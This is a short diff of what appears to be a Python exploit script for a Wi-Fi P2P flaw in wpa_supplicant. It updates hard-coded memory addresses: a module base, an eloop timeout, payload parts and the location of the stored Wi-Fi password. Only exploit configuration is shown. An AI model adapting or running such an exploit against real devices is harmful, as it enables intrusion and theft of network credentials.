@@ -21,7 +21,7 @@ args = parser.parse_args()
 iface = args.interface        # interface in monitor mode
 target = args.target          # target MAC address
 
-base  = 0x5589cf4000          # base address of main module
+base  = 0x558ed61000          # base address of main module
 
 eloop = 0x7fb6e32780          # eloop_timeout address
 p2    = 0x7fb6e2f320          # second part of payload
@@ -29,7 +29,7 @@ p2p_data = 0x7fb6e98000       # first parm of p2p_set_dev_name
 passwd   = 0x7fb6e2b460       # address of Wi-Fi password
 
 eloop_next = base + 0x1f0770  # eloop next (&list terminates)
-wpa_printf = base + 0x027d48  # addr of wpa_printf
+# wpa_printf = base + 0x027d48  # addr of wpa_printf
 
 p2p_set_dev_name = base + 0x060c3c
 
